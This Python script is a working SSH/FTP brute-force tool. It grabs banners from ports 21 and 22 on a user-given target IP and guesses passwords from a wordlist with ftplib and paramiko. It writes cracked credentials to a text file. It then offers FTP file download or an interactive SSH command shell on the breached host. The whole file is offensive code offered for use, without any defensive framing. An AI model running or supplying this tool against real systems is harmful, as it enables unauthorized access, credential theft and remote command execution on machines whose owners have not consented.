import socket, ftplib, paramiko  # First importing on the required libraries


def main():  # The main function that is responsible for scanning and direction the user to specific functions to use
    print("Welcome to Shenhav's ultimate SSH/FTP tool")
    target_ip = input("Please enter your target ip: ")
    portlist = [21, 22]  # 21 in ftp, 22 is SSH
    for port in portlist:  # running for each port:
        sock = socket.socket()
        try:
            sock.connect((target_ip, port))  # Trying to connect to the ip with each port
            sock.settimeout(1)
            sock.send("test\r\n".encode())
            banner = sock.recv(1000000).decode()  # Catching the response because it's the banner of that service
            print(f" port {port} is open\n{banner}")
            sock.close()
            again_all = 1  # Main loop so that if the user will write a mistake the script won't exit
            while again_all:
                to_attack = input(f"Would you like to brute-force {target_ip} on port {port}? [yes/no]").lower()
                if to_attack == "yes" or to_attack == "y":
                    print(f"Attacking {target_ip} on port {port}")
                    # -----------------------------------------------------------------------------------------------------------------------
                    if port == 21:  # If the user choose to attack then the scrip checks which port is currently running
                        try_ftp_again = 1
                        while try_ftp_again:  # Loop for if the user want to try again to brute force
                            username = input("Enter username: ")
                            password = ftp_brute(target_ip, username)  # Using the ftp brute function and defining
                            # the return as password so if the user will want to open shell later the script has the
                            # password from the brute force
                            if password != "didn't_found_password":  # If it found password then:
                                while True:
                                    # Asking the user if he wants to save his credential.
                                    to_save_ftp = input(
                                        "Do you want to save the credential you found to a file? [yes/no] ").lower()
                                    if to_save_ftp == "yes" or to_save_ftp == "y":
                                        save(target_ip, username, password)
                                        break
                                    elif to_save_ftp == "no" or to_save_ftp == "n":
                                        break
                                    else:
                                        print("You didn't enter a valid option")

                                open_shell = 1
                                while open_shell:
                                    to_open_shell = input("Do want to open an interactive shell? [yes/no]").lower()
                                    if to_open_shell == "yes" or to_open_shell == "y":
                                        open_shell = 0
                                        try_ftp_again = 0  # Redirecting the user to the shell opening function with
                                        # all the information needed, and defining the loops as false so when he
                                        # returns to the main function the script will continue to the next port
                                        again_all = 0
                                        open_shell_ftp(target_ip, username, password)
                                    elif to_open_shell == "no" or to_open_shell == "n":
                                        print("Not opening shell\n Moving on....")
                                        open_shell = 0
                                        try_ftp_again = 0
                                        again_all = 0
                                    else:
                                        print("You didn't enter a valid option")
                            else:
                                while True:
                                    try_again = input("Do you want to try with another username or password list?"
                                                      " [yes/no] ").lower()
                                    # If the user chooses yes then it exits this loop and since the "try ftp again
                                    # shell is true it returns to it"
                                    if try_again == "yes" or try_again == "y":
                                        break
                                    elif try_again == "no" or try_again == "n":
                                        print("Moving on....")
                                        try_ftp_again = 0
                                        again_all = 0
                                        break
                                    else:
                                        print("You didn't enter a valid option")
                                        continue
                    # -------------------------------------------------------------------------------------------------------------------
                    elif port == 22:  # same as the ftp loops but this time for port 22
                        again_all = 1
                        try_ssh_again = 1
                        while try_ssh_again:
                            username = input("Enter username: ")
                            password = ssh_brute(target_ip, username)
                            if password != "didn't_found_password":
                                try_ssh_again = 0
                                while True:
                                    # Asking the user if he wants to save his credential.
                                    to_save_ssh = input(
                                        "Do you want to save the credential you found to a file? [yes/no] ").lower()
                                    if to_save_ssh == "yes" or to_save_ssh == "y":
                                        save(target_ip, username, password)
                                        break
                                    elif to_save_ssh == "no" or to_save_ssh == "n":
                                        break
                                    else:
                                        print("You didn't enter a valid option")
                                while True:
                                    to_open_shell = input("Do want to open an interactive shell? [yes/no]").lower()
                                    if to_open_shell == "yes" or to_open_shell == "y":
                                        open_shell_ssh(target_ip, username, password)
                                        again_all = 0
                                        break
                                    elif to_open_shell == "no" or to_open_shell == "n":
                                        print("Not opening shell")
                                        again_all = 0
                                        break
                                    else:
                                        print("You didn't enter a valid option")
                            else:
                                while True:
                                    try_again = input("Do you want to try again with another username or password "
                                                      "list? [yes/no] ").lower()
                                    if try_again == "yes" or try_again == "y":
                                        break
                                    elif try_again == "no" or try_again == "n":
                                        try_ssh_again = 0
                                        again_all = 0
                                        print("Goodbye:(")
                                        break
                                    else:
                                        print("You didn't enter a valid option")

                    else:
                        print("Something wrong")
                elif to_attack == "no" or to_attack == "n":
                    print("Not attacking")
                    break
                else:
                    print("You didn't enter a valid option")
        # error handling for each case, host is up and port is down, host is down, or ip isn't correct
        except ConnectionRefusedError:
            print(f"Port {port} on {target_ip} is closed")
        except TimeoutError:
            print("Host has failed to respond in time")
        except socket.gaierror:
            print("Host is down or ip address is not correct")
            break


# ---------------------------------------------------------------------------------------------------------------------

def ftp_brute(ip, username):  # Brute-force for ftp
    login = 1
    while login:
        try:
            sock = ftplib.FTP(timeout=5)
            passwordlist_location = input("Enter the path of your password list file: ")  # requesting a file location
            with open(passwordlist_location, "r") as passwordlist:  # Opening the file and trying each password
                for password in passwordlist:
                    password = password.replace("\n", "")
                    sock.connect(ip, 21)
                    try:
                        sock.login(username, password)
                        print(f"Login successful with the password {password} ")
                        login = 0
                        return password  # If it found the password then it returns it to the main function
                    except ftplib.error_perm:
                        print(f"{password} is incorrect")
                        sock.close()
                        continue
                print("Password not found:(")
                not_found = "didn't_found_password"
                return not_found  # if the scrip didn't found the password then it returns not found so that the script
                # won't try to open shell
        # Error handling if the host is suddenly down or any other option that can accrue
        except ConnectionRefusedError:
            print("FTP is closed")
        except ftplib.error_perm:
            print("Login is incorrect")
        except socket.timeout:
            print("Host is down")
        except socket.gaierror:
            print("invalid ip")
        except FileNotFoundError:
            print("Cant find file or directory")


# ---------------------------------------------------------------------------------------------------------------------
def open_shell_ftp(ip, username, password):  # Open shell function for ftp
    shell_ftp = 1
    while shell_ftp:
        try:
            sock = ftplib.FTP(timeout=5)
            sock.connect(ip, 21)
            sock.login(username, password)  # connection to ftp with the username and the password that we found earlier
            while True:
                option = input("Enter the option you want to do: \n"  # Opening a menu for the user
                               "[1] pwd\n"
                               "[2] cwd \n"
                               "[3] dir\n"
                               "[4] get file\n"
                               "[5] exit\n")
                if option == "1":
                    print(sock.pwd())
                elif option == "2":
                    location = input("Enter the location you want to go to: ")
                    sock.cwd(location)
                elif option == "3":
                    sock.dir()
                elif option == "4":
                    nameoffile = input("enter the name of the file you want to download: ")
                    filetodownload = open(nameoffile, "wb")
                    sock.retrbinary(f'RETR {nameoffile}', filetodownload.write)
                    print("downloading file......")
                    filetodownload.close()
                elif option == "5":
                    print("Exiting......\n Moving on ......")
                    sock.close()
                    shell_ftp = 0
                    break
                else:
                    print("You did not enter a valid option")
        # Error handling
        except ConnectionRefusedError:
            print("FTP is closed")
        except socket.timeout:
            print("Host is down")
        except socket.gaierror:
            print("invalid ip")
        except ftplib.error_perm as a:  # Because there are multiple errors I just print the error that comes up
            print(a)


# ---------------------------------------------------------------------------------------------------------------------


def ssh_brute(ip, username):  # ssh brute force
    while True:
        try:
            passwordlist_location = input("Enter the path of your password list file: ")
            with open(passwordlist_location, "r") as passwordlist:
                for password in passwordlist:
                    password = password.replace("\n", "")
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(ip, 22, username, password)  # Trying to log in with each password
                        print(f"Success! user is {username} and password is {password}")
                        ssh.close()
                        return password
                    # This error means the credentials are incorrect
                    except paramiko.ssh_exception.AuthenticationException:
                        print(f"{password} is incorrect")
                        ssh.close()
                        continue
            print("Password not found:(")
            not_found = "didn't_found_password"
            return not_found  # If the script didn't found the password it returns not found to the main function
        except FileNotFoundError:
            print("Cant find file or directory")


# ---------------------------------------------------------------------------------------------------------------------

# Opening shell in ssh with the credential we found
def open_shell_ssh(ip, username, password):
    to_exit = 1
    while to_exit:  # The loop is running while the user didn't put exit in the command
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, 22, username, password)  # connecting
            command = input("Enter command: ")
            if command == "exit":
                print("Exiting shell")
                to_exit = 0
            stdin, stdout, stderr = ssh.exec_command(command)  # Running the command on the host
            print(stdout.read().decode())  # printing the result
            print(stderr.read().decode())

        except paramiko.ssh_exception.AuthenticationException:
            print("Invalid credentials")


# ---------------------------------------------------------------------------------------------------------------------
def save(ip, username, password):
    # Saving the score into a txt file in the script location with 'a' so it will add the score if there is
    # already scores inside the file
    with open('credentials.txt', 'a') as f:
        f.write(f"Ip address: {ip} - Username: {username} - Password: {password}")
        f.write('\n')
    print("Your credentials are saved in: credentials.txt")


if __name__ == "__main__":
    main()
